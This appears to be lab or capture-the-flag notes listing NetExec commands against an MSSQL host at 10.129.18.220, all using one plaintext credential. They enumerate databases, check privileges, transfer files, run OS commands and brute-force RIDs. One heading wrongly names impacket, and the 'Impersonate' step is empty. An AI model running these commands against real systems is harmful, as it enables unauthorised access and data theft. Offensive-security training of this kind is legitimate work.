



```
nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth  -q 'SELECT name FROM master.dbo.sysdatabases;'
```

Use impacket to check privileges:

```
nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -M mssql_priv
```

Impersonate:




Upload:

```
nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!' --put-file /tmp/users C:\\Windows\\Temp\\whoami.txt
```

Download:

```
nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!'  --get-file C:\\Windows\\Temp\\whoami.txt /tmp/file
```

Run commands:

```
nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -x whoami
```

Enumerate users by bruteforcing RID:

```
nxc mssql 10.129.18.220 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
```

